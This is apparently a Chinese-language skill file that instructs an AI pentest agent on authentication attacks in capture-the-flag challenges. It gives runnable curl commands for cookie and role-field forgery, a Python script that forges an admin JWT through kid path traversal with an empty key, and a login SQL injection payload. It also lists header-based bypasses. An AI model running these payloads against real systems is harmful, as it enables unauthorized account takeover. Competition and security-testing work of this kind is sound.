---
name: auth-attack
description: 认证突破与凭据攻击。用于登录框、角色区分后台、SSH 或裸 TCP 登录、API 鉴权场景，覆盖默认/测试凭据、有限爆破、会话与角色伪造、JWT(none/kid/弱密钥)攻击、Flask 签名会话分析。任何带登录的目标先加载。 使用 curl、ssh、nc、python3 与已装 Flask 库。
---

# 认证突破与凭据攻击

原则：**先找页面自己泄露的凭据，再谈爆破。** 爆破是最后手段。

## 0. 凭据入口与验证

先读当前题提供的页面、前端脚本和配置，提取明确泄露的账号或产品指纹。未确认产品前不要跑通用账号乘口令矩阵。识别产品后查本地 vendor-defaults.txt；按 PI 系统规则控制请求速率和尝试量，出现锁定或限速立即停止。成功依据为跳转、Cookie、身份接口及授权资源变化，不能只看状态码。

## 1. 会话伪造（命中率极高，优先于爆破）

### 1.1 直改 Cookie
```bash
curl -s -H "Cookie: role=admin; is_admin=1; user_type=admin" http://TARGET/admin
curl -s -H "Cookie: user=admin; logged_in=true" http://TARGET/dashboard
```

### 1.2 Flask 签名会话

先确认 Cookie 确实由 Flask itsdangerous 签名，并从题目文件或源码取得候选密钥。使用与目标版本、salt、序列化器和摘要算法一致的受测工具验证；不要把普通 HMAC 示例当作 Flask 会话格式。

### 1.3 JWT 攻击（确认令牌格式后）

先解码看结构：
```bash
curl -s http://TARGET/api/me -H 'Cookie: token=eyJ...'   # 拿一个合法 token
python3 -c "
import base64,json,sys
t='eyJ...'
for seg in t.split('.')[:2]:
    seg += '='*(-len(seg)%4)
    print(json.loads(base64.urlsafe_b64decode(seg)))
"
```

按顺序打：

| 手法 | 触发条件 | 做法 |
|---|---|---|
| **alg=none** | 后端未校验签名 | 头改 `{"alg":"none"}`，签名段留空 |
| **kid 路径穿越** | 头里有 `kid` | `"kid":"../../../dev/null"` + 用空密钥 HMAC |
| **kid 取密钥文件** | 头里 `kid:"prod.key"` | 先想办法读到 `prod.key`（路径穿越/静态泄露），再用它 HS256 签 |
| **弱密钥爆破** | HS256 + 未知密钥 | `Python hashlib/hmac 对当前题小字典做离线签名校验` |
| **RS256→HS256** | 能拿到公钥 | 用公钥当 HMAC 密钥签 |

kid 穿越示例（头 `{"alg":"HS256","kid":"../../../../dev/null"}`，密钥为空）：
```bash
python3 - <<'PY'
import base64,hmac,hashlib,json
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=').decode()
h=b(json.dumps({"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}).encode())
p=b(json.dumps({"email":"admin@example.com","role":"admin","exp":9999999999}).encode())
m=f"{h}.{p}"
print(m+'.'+b(hmac.new(b'',m.encode(),hashlib.sha256).digest()))
PY
```

> kid 只表明令牌声明了密钥标识；先验证服务端是否信任该字段，以及能否从题目文件读取对应密钥。不要仅凭 kid 出现就认定可控。

## 2. 角色字段提权（不碰密码，直接改身份）

```bash
# JSON body 加字段
curl -s -b cookies.txt -X POST http://TARGET/api/profile \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@example.com","role":"admin","user_type":"admin","is_admin":true}'

# 注册接口直接注册管理员
curl -s -X POST http://TARGET/register -H 'Content-Type: application/json' \
  -d '{"username":"x","password":"x","role":"admin"}'
```

## 3. 远程登录

只有题目给出 SSH 或裸 TCP 登录入口和有依据的凭据时才尝试；分别使用镜像内 ssh 或 nc。先确认产品默认值，再按系统规则的限速与字典上限验证。获得新身份后转 multi-stage，不做无范围的主机枚举。

## 4. 其它高频缺陷

- 验证码：可复用 / 可爆破 / 响应里有明文 / 前端校验
- 找回密码：验证码可预测（时间戳、4 位）、可改 `email` 参数重置他人
- 认证绕过：`X-Forwarded-User`、`X-Original-URL`、`X-Rewrite-URL`、路径 `;/` `%2e`
- 登录点 SQLi：`username=admin'-- -`（先看是否有 WAF）

## 5. 有依据的认证测试

依次使用题面泄露凭据、已识别产品的本地默认值，再考虑当前题的小字典。按 PI 系统规则限制请求频率与规模；出现限速或锁定迹象，立即停止该组。对登录结果比较跳转、Cookie 与身份接口，避免把 200 当成成功。

## 6. 反模式

- ❌ 一上来跑大字典爆破（慢且噪）。
- ❌ 只看 200 判定成功（302/Set-Cookie/页面差异才是真相）。
- ❌ JWT 只试 `alg=none` 就放弃——kid 与密钥泄露才是常见考点。
- ❌ 拿到低权账号就止步——低权账号的价值是**看清角色字段名和内部接口**。

## 7. 输出

`有效凭据/伪造方式 + 提权后可见资源 + flag 路径`。

## 比赛优先级

优先复用题面泄露的凭据与低权会话，按角色和对象验证可访问的功能。若低权身份能接触新服务或云主体，转 multi-stage 或 cloud-exploit。
